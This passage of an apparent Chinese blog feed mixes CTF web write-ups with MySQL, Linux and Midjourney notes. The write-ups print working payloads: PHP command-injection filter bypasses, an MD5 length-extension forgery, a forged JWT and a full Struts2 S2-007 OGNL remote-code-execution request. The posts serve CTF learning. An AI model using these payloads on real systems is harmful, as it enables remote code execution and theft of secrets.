class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了<code>PWD</code>、<code>#</code>但放出了<code>HOME</code></p><p>需要说明的是：/ 可以通过 HOME 获取，需要数字1，但 # 也被过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HOME即/root</span><br></pre></td></tr></table></figure><p>$? 表示上一条命令执行结束后的传回值。通常0表示执行成功，非0表示执行有误<br>有部分指令执行失败时会返回1，也有一些命令返回其他值，表示不同类型的错误<br>比如Command not found就会返回127</p><p>为了能让 $? 能够返回1，则需要让前一条命令是错误的，这个错误命令的返回值就是1</p><p>这里的话可以用 <code>&lt;A</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;A 提示的错误是no such file or dictionary，它对应的error code 是2</span><br><span class="line">但是 $? 的结果是1</span><br></pre></td></tr></table></figure><p>然后是选构造的命令<br>这里选择使用的是：/bin/base64 毕竟${RANDOM}没有被禁用<br>所以需要构造 /???/???4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code=&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span><br><span class="line">即：/???/?????4 ????.???</span><br></pre></td></tr></table></figure><p><s>概率大概是十分之一，拼人品的时候来了</s><br>&lt;A 先让指令执行错误，然后 $? 取到的值就为1了</p><h2 id="web124">web124</h2><h3 id="题目描述">题目描述</h3><p><strong>RCE</strong></p><h3 id="解题思路">解题思路</h3><p>思路是利用php动态函数构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])&amp;a=system&amp;b=cat flag</span><br></pre></td></tr></table></figure><p>[]过滤用{}绕过</p><p>根据源码提示 _GET用php数学函数编码绕过</p><p>常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) = hex2bin</span><br><span class="line"><span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>) = <span class="number">5</span>f474554</span><br><span class="line"><span class="title function_ invoke__">hex2bin</span>(<span class="string">&quot;5f474554&quot;</span>) = _GET</span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>)) = _GET</span><br></pre></td></tr></table></figure><p>注意要求长度小于80，可利用php可变变量缩短长度，变量名从白名单中选取</p><p><code>payload:?c=$abs=base_convert(37907361743,10,36)(dechex(1598506324));$$abs&#123;cos&#125;($$abs&#123;exp&#125;)&amp;cos=system&amp;exp=cat flag.php</code></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql数据库从基础到进阶学习笔记</title>
      <link href="/2023/08/07/MySql/"/>
      <url>/2023/08/07/MySql/</url>
      
        <content type="html"><![CDATA[<h1>Mysql数据库（基础篇）</h1><h2 id="引言">引言</h2><blockquote><p>本笔记使用软件版本为 Mysql Community Server 8.0.26</p></blockquote><p>连接数据库：</p><ol><li>使用MySQL自带的命令行工具</li><li>Windows命令行输入mysql -u root -p(需要配置PATH环境变量)</li></ol><p>图形化界面工具：</p><ul><li>Workbench(免费): <a href="http://dev.mysql.com/downloads/workbench/">http://dev.mysql.com/downloads/workbench/</a></li><li>navicat(收费，试用版30天): <a href="https://www.navicat.com/en/download/navicat-for-mysql">https://www.navicat.com/en/download/navicat-for-mysql</a></li><li>Sequel Pro(开源免费，仅支持Mac OS): <a href="http://www.sequelpro.com/">http://www.sequelpro.com/</a></li><li>HeidiSQL(免费): <a href="http://www.heidisql.com/">http://www.heidisql.com/</a></li><li>phpMyAdmin(免费): <a href="https://www.phpmyadmin.net/">https://www.phpmyadmin.net/</a></li><li>SQLyog: <a href="https://sqlyog.en.softonic.com/">https://sqlyog.en.softonic.com/</a></li></ul><blockquote><p>本笔记使用DataGrip图形化界面工具，版本为2023.2</p></blockquote><h2 id="通用语法及分类">通用语法及分类</h2><p>SQL通用语法<br>1). SQL语句可以单行或多行书写，以分号结尾。<br>2). SQL语句可以使用空格/缩进来增强语句的可读性。<br>3). MySQL数据库的SQL语句不区分大小写，关键字建议使用大写。<br>4). 注释：单行注释：-- 注释内容 或 # 注释内容 ;多行注释：/* 注释内容 */</p><ul><li>DDL: 数据定义语言，用来定义数据库对象（数据库、表、字段）</li><li>DML: 数据操作语言，用来对数据库表中的数据进行增删改</li><li>DQL: 数据查询语言，用来查询数据库中表的记录</li><li>DCL: 数据控制语言，用来创建数据库用户、控制数据库的控制权限</li></ul><h3 id="ddl-数据定义语言">DDL（数据定义语言）</h3><p>数据定义语言</p><h4 id="数据库操作">数据库操作</h4><p>查询所有数据库：<br><code>SHOW DATABASES;</code><br>查询当前数据库：<br><code>SELECT DATABASE();</code><br>创建数据库：<br><code>CREATE DATABASE [ IF NOT EXISTS ] 数据库名 [ DEFAULT CHARSET 字符集] [COLLATE 排序规则 ];</code><br>删除数据库：<br><code>DROP DATABASE [ IF EXISTS ] 数据库名;</code><br>使用数据库：<br><code>USE 数据库名;</code></p><h5 id="注意事项">注意事项</h5><ul><li>UTF8字符集长度为3字节，有些符号占4字节，所以推荐用utf8mb4字符集</li></ul><h4 id="表操作">表操作</h4><p>查询当前数据库所有表：<br><code>SHOW TABLES;</code><br>查询表结构：<br><code>DESC 表名;</code><br>查询指定表的建表语句：<br><code>SHOW CREATE TABLE 表名;</code></p><p>创建表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名(    </span><br><span class="line">字段<span class="number">1</span> 字段<span class="number">1</span>类型 [COMMENT 字段<span class="number">1</span>注释],    </span><br><span class="line">字段<span class="number">2</span> 字段<span class="number">2</span>类型 [COMMENT 字段<span class="number">2</span>注释],    </span><br><span class="line">字段<span class="number">3</span> 字段<span class="number">3</span>类型 [COMMENT 字段<span class="number">3</span>注释],    </span><br><span class="line">...    </span><br><span class="line">字段n 字段n类型 [COMMENT 字段n注释])[ COMMENT 表注释 ];</span><br></pre></td></tr></table></figure><p><strong>最后一个字段后面没有逗号</strong></p><p>添加字段：<br><code>ALTER TABLE 表名 ADD 字段名 类型(长度) [COMMENT 注释] [约束];</code><br>例：<code>ALTER TABLE emp ADD nickname varchar(20) COMMENT '昵称';</code></p><p>修改数据类型：<br><code>ALTER TABLE 表名 MODIFY 字段名 新数据类型(长度);</code><br>修改字段名和字段类型：<br><code>ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型(长度) [COMMENT 注释] [约束];</code><br>例：将emp表的nickname字段修改为username，类型为varchar(30)<br><code>ALTER TABLE emp CHANGE nickname username varchar(30) COMMENT '昵称';</code></p><p>删除字段：<br><code>ALTER TABLE 表名 DROP 字段名;</code></p><p>修改表名：<br><code>ALTER TABLE 表名 RENAME TO 新表名</code></p><p>删除表：<br><code>DROP TABLE [IF EXISTS] 表名;</code><br>删除表，并重新创建该表：<br><code>TRUNCATE TABLE 表名;</code></p><h3 id="dml-数据操作语言">DML（数据操作语言）</h3><h4 id="添加数据">添加数据</h4><p>指定字段：<br><code>INSERT INTO 表名 (字段名1, 字段名2, ...) VALUES (值1, 值2, ...);</code><br>全部字段：<br><code>INSERT INTO 表名 VALUES (值1, 值2, ...);</code></p><p>批量添加数据：<br><code>INSERT INTO 表名 (字段名1, 字段名2, ...) VALUES (值1, 值2, ...), (值1, 值2, ...), (值1, 值2, ...);</code><br><code>INSERT INTO 表名 VALUES (值1, 值2, ...), (值1, 值2, ...), (值1, 值2, ...);</code></p><h5 id="注意事项">注意事项</h5><ul><li>字符串和日期类型数据应该包含在引号中</li><li>插入的数据大小应该在字段的规定范围内</li></ul><h4 id="更新和删除数据">更新和删除数据</h4><p>修改数据：<br><code>UPDATE 表名 SET 字段名1 = 值1, 字段名2 = 值2, ... [ WHERE 条件 ];</code><br>例：<br><code>UPDATE emp SET name = 'Jack' WHERE id = 1;</code></p><p>删除数据：<br><code>DELETE FROM 表名 [ WHERE 条件 ];</code></p><h3 id="dql-数据查询语言">DQL（数据查询语言）</h3><p>语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>    </span><br><span class="line">    字段列表</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    表名字段</span><br><span class="line"><span class="keyword">WHERE</span>    </span><br><span class="line">    条件列表</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span></span><br><span class="line">    分组字段列表</span><br><span class="line"><span class="keyword">HAVING</span></span><br><span class="line">    分组后的条件列表</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span></span><br><span class="line">    排序字段列表</span><br><span class="line">LIMIT</span><br><span class="line">    分页参数</span><br></pre></td></tr></table></figure><h4 id="基础查询">基础查询</h4><p>查询多个字段：<br><code>SELECT 字段1, 字段2, 字段3, ... FROM 表名;</code><br><code>SELECT * FROM 表名;</code></p><p>设置别名：<br><code>SELECT 字段1 [ AS 别名1 ], 字段2 [ AS 别名2 ], 字段3 [ AS 别名3 ], ... FROM 表名;</code><br><code>SELECT 字段1 [ 别名1 ], 字段2 [ 别名2 ], 字段3 [ 别名3 ], ... FROM 表名;</code></p><p>去除重复记录：<br><code>SELECT DISTINCT 字段列表 FROM 表名;</code></p><p>转义：<br><code>SELECT * FROM 表名 WHERE name LIKE '/_张三' ESCAPE '/'</code><br>/ 之后的_不作为通配符</p><h4 id="条件查询">条件查询</h4><p>语法：<br><code>SELECT 字段列表 FROM 表名 WHERE 条件列表;</code></p><p>条件：</p><table><thead><tr><th style="text-align:left">比较运算符</th><th style="text-align:left">功能</th></tr></thead><tbody><tr><td style="text-align:left">&gt;</td><td style="text-align:left">大于</td></tr><tr><td style="text-align:left">&gt;=</td><td style="text-align:left">大于等于</td></tr><tr><td style="text-align:left">&lt;</td><td style="text-align:left">小于</td></tr><tr><td style="text-align:left">&lt;=</td><td style="text-align:left">小于等于</td></tr><tr><td style="text-align:left">=</td><td style="text-align:left">等于</td></tr><tr><td style="text-align:left">&lt;&gt; 或 !=</td><td style="text-align:left">不等于</td></tr><tr><td style="text-align:left">BETWEEN … AND …</td><td style="text-align:left">在某个范围内（含最小、最大值）</td></tr><tr><td style="text-align:left">IN(…)</td><td style="text-align:left">在in之后的列表中的值，多选一</td></tr><tr><td style="text-align:left">LIKE 占位符</td><td style="text-align:left">模糊匹配（_匹配单个字符，%匹配任意个字符）</td></tr><tr><td style="text-align:left">IS NULL</td><td style="text-align:left">是NULL</td></tr></tbody></table><table><thead><tr><th style="text-align:left">逻辑运算符</th><th style="text-align:left">功能</th></tr></thead><tbody><tr><td style="text-align:left">AND 或 &amp;&amp;</td><td style="text-align:left">并且（多个条件同时成立）</td></tr><tr><td style="text-align:left">OR 或 ||</td><td style="text-align:left">或者（多个条件任意一个成立）</td></tr><tr><td style="text-align:left">NOT 或 !</td><td style="text-align:left">非，不是</td></tr></tbody></table><p>例子：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 年龄等于30</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> age <span class="operator">=</span> <span class="number">30</span>;</span><br><span class="line"><span class="comment">-- 年龄小于30</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> age <span class="operator">&lt;</span> <span class="number">30</span>;</span><br><span class="line"><span class="comment">-- 小于等于</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> age <span class="operator">&lt;=</span> <span class="number">30</span>;</span><br><span class="line"><span class="comment">-- 没有身份证</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> idcard <span class="keyword">is</span> <span class="keyword">null</span> <span class="keyword">or</span> idcard <span class="operator">=</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">-- 有身份证</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> idcard;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> idcard <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">-- 不等于</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> age <span class="operator">!=</span> <span class="number">30</span>;</span><br><span class="line"><span class="comment">-- 年龄在20到30之间</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> age <span class="keyword">between</span> <span class="number">20</span> <span class="keyword">and</span> <span class="number">30</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> age <span class="operator">&gt;=</span> <span class="number">20</span> <span class="keyword">and</span> age <span class="operator">&lt;=</span> <span class="number">30</span>;</span><br><span class="line"><span class="comment">-- 下面语句不报错，但查不到任何信息</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> age <span class="keyword">between</span> <span class="number">30</span> <span class="keyword">and</span> <span class="number">20</span>;</span><br><span class="line"><span class="comment">-- 性别为女且年龄小于30</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> age <span class="operator">&lt;</span> <span class="number">30</span> <span class="keyword">and</span> gender <span class="operator">=</span> <span class="string">&#x27;女&#x27;</span>;</span><br><span class="line"><span class="comment">-- 年龄等于25或30或35</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> age <span class="operator">=</span> <span class="number">25</span> <span class="keyword">or</span> age <span class="operator">=</span> <span class="number">30</span> <span class="keyword">or</span> age <span class="operator">=</span> <span class="number">35</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> age <span class="keyword">in</span> (<span class="number">25</span>, <span class="number">30</span>, <span class="number">35</span>);</span><br><span class="line"><span class="comment">-- 姓名为两个字</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;__&#x27;</span>;</span><br><span class="line"><span class="comment">-- 身份证最后为X</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employee <span class="keyword">where</span> idcard <span class="keyword">like</span> <span class="string">&#x27;%X&#x27;</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>*CTF-2023 Web方向题解</title>
      <link href="/2023/07/30/XCTF/"/>
      <url>/2023/07/30/XCTF/</url>
      
        <content type="html"><![CDATA[<p>复旦<code>******战队</code>命题<br>web方向题解</p><h2 id="jwt2struts">jwt2struts</h2><h3 id="题目描述">题目描述</h3><p>140.210.223.216:55557<br>flag format: *ctf{}</p><h3 id="解题思路">解题思路</h3><p>进入靶机后提示<code>Try to become admin.</code><br>发现cookie中含有access_token，再根据题目猜想应该为伪造jwt<br>查看源代码，发现<code>&lt;!-- JWT_key.php --&gt;</code>路由</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./secret_key.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./salt.php&quot;</span>;</span><br><span class="line"><span class="comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span></span><br><span class="line"><span class="comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span></span><br><span class="line">@<span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">@<span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> != <span class="string">&quot;root&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="variable">$username</span>.<span class="variable">$password</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The secret_key is &quot;</span>. <span class="variable">$secret_key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码审计，目的是得到secret_key用以伪造JWT<br>难点在于如何构造digest的值，给出了<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>a</mi><mi>l</mi><mi>t</mi><mtext>的位数，</mtext></mrow><annotation encoding="application/x-tex">salt的位数，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">，</span></span></span></span>salt.&quot;adminroot&quot;的MD5值<br>满足使用<a href="https://www.cnblogs.com/cfqlovem-521/p/16185173.html">MD5长度扩展攻击的条件</a>的条件<br>使用HashPump工具生成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">apt-get install g++ libssl-dev</span><br><span class="line">cd HashPump/</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">hashpump</span><br><span class="line">Input Signature: e6ccbf12de9d33ec27a5bcfb6a3293df #给出的MD5值</span><br><span class="line">Input Data: root #想要替换的参数</span><br><span class="line">Input Key Length: 19  #不变部分的位数</span><br><span class="line">Input Data to Add: admin #要替换的部分</span><br><span class="line">6519ec47114e100735c1d3ff1bb704ff #得到的新MD5值</span><br><span class="line">root\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00admin #要传入的passwd</span><br></pre></td></tr></table></figure><p>因为传入password后要经过一次url解码，故将得到的passwd中\x换成%后，url编码传入<br>得到<code>secret_key=sk-he00lctf3r</code><br>接下来伪造<a href="https://jwt.io/">JWT</a><br>先将原有的token解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjoyMDA2MjMwNDMzfQ.sD0hbwejdG0bqUBwxt68rbAnZbXb3hid5zHG9Qq4TqA</span><br><span class="line"></span><br><span class="line">HEADER:</span><br><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br><span class="line">PAYLOAD:</span><br><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;exp&quot;: 2006230433</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将<code>&quot;sub&quot;</code>改为admin后，输入密钥生成新的JWT<br>传参后进入<code>/admiiiiiiiiiiin</code>，根据题目提示为<a href="https://xz.aliyun.com/t/2684">struts-s2-007远程代码执行漏洞</a><br>FLAG在环境变量里，抓包传入age进行RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1&amp;email=1&amp;age=%27+%2b+(%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23foo%3dnew+java.lang.Boolean(%22false%22)+%2c%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3d%23foo%2c%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(%27env%27).getInputStream()))+%2b+%27</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/07/29/boJWaXpx.png" alt="成功"><br>注意flag格式</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最强绘画AI——Midjourney使用分享</title>
      <link href="/2023/07/26/Midjourney/"/>
      <url>/2023/07/26/Midjourney/</url>
      
        <content type="html"><![CDATA[<p>使用准备：</p><ol><li>科学上网工具</li><li>discord会员账号</li></ol><p>网上的使用教程很多，我就不过多赘述<br>分享几个视频或博客<br><a href="https://www.bilibili.com/video/BV1JX4y167jA/?share_source=copy_web&amp;vd_source=64c12924daa57dc991f9ad131bfa7883">【AI绘画】Midjourney保姆级全方位教程</a><br><a href="https://www.zhihu.com/question/592244719/answer/2976361303?utm_id=0">你还不会用Midjourney?</a><br>发现关键词的描述词详细与否和权重是影响出图的重要因素<br>可以根据<a href="https://www.midjourney.com/app/feed/">官网</a>展示的瀑布流中大佬的成图学习如何描述<br>发现几个槽点，即使经过不断更新，细节上的问题也很多<s>例如不会画手</s><br>而且使用/relax模式时（可能因为不调用显卡或是我的节点问题？），出图速度巨慢</p><p><img src="https://img1.imgtp.com/2023/07/25/xrJj7cjV.png" alt="成品展示1"></p><p><img src="https://img1.imgtp.com/2023/07/25/ZmKVfdCT.png" alt="成品展示2"></p><p><img src="https://cdn.midjourney.com/116f3d05-874c-4578-98aa-b382cc488df8/0_3.png" alt="成品展示3"></p><p>操作简单，可选择模型较多，以上三张图只在默认AI模型下生成<br><img src="https://img1.imgtp.com/2023/07/25/gJIhXZ9a.png" alt=""><br>经过不断调整，基本上都能得到满意的图片<br>普通人也能轻松diy符合自己审美的各种风格的图片</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Midjourney </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux基础学习笔记</title>
      <link href="/2023/07/22/Linux/"/>
      <url>/2023/07/22/Linux/</url>
      
        <content type="html"><![CDATA[<h1>Linux 笔记（新）</h1><blockquote><p>感觉之前记录的笔记太细碎了，不够系统，来重置一下<br>笔记偏向工程应用，不剖析原理，分析内核源码等<s>可能以后补上</s></p></blockquote><h2 id="常见文件管理命令">常见文件管理命令</h2><p><strong>Linux目录结构</strong>：</p><p>所有文件夹均在根目录<code>\</code>下，常见文件夹包括<code>bin</code>（储存可执行命令文件）、<code>etc</code>（储存配置文件，如nginx配置文件）、<code>var</code>（存储日志文件夹log）、<code>lib</code>（存放安装包或库文件）、<code>home</code>（用户的家目录，存在以用户名命名的文件夹）、<code>proc</code>（进程的相关信息）</p><p><strong>描述路径的两种方式</strong>：</p><p>1.绝对路径（从根目录开始描述）<br>2.相对路径（从当前目录开始描述）<br>3.特殊目录：<code>..</code>上一级目录，<code>.</code>当前目录，<code>~</code>家目录</p><p><strong>基本操作</strong><br><code>ctrl + C</code>: 终止当前命令/进程，并且换行<br><code>ctrl + U</code>: 清空本行命令<br><code>tab</code>键：可以补全命令和文件名，如果补全不了快速按两下tab键，可以显示备选选项<br>方向键↑/↓：可以回到上一个/下一条命令</p><p><strong>基本命令</strong><br><code>ls</code>: 列出当前目录下所有文件，蓝色的是文件夹，白色的是普通文件，绿色的是可执行文件(不一定)</p><p>参数：<br><code>-l </code>: 展示详细信息（文件类型，权限，大小）<br><code>-h </code>: 人性化的显示详细信息（30926=&gt;31K）<br><code>-a </code>: 显示所有的文件(包括被隐藏的文件, 所有被隐藏的文件都是以.开头的);<br><code>ll</code> 等价于<code>ls -la</code></p><p><code>pwd</code>: 显示当前位置;</p><p><code>cd</code>: cd + 路径;<br>cd 默认返回家目录, <code>cd ..</code> 返回上一层目录, <code>cd -</code> 返回上一个待过的目录;</p><p><code>cp</code>: cp 路径1 路径2;<br>(将路径1内容复制一份放路径2里面, 复制 + 粘贴 + 重命名);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line">cp a/tmp.txt b (复制一份到粘贴到b里面)；</span><br><span class="line">cp a/tmp.txt b/tmp2.txt; (复制一份到粘贴到b里面,并重命名)</span><br><span class="line">如果复制文件夹后面加-r</span><br><span class="line">cp a b -r; (将a复制一份粘贴到b里面)</span><br></pre></td></tr></table></figure><blockquote><p><code>*</code> 表示本文件夹里所有文件(正则语法)</p></blockquote><p><code>mkdir a</code> :创建文件夹a<br><code>mkdir</code>: 创建文件夹;(可以加-p创建一系列的文件夹)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 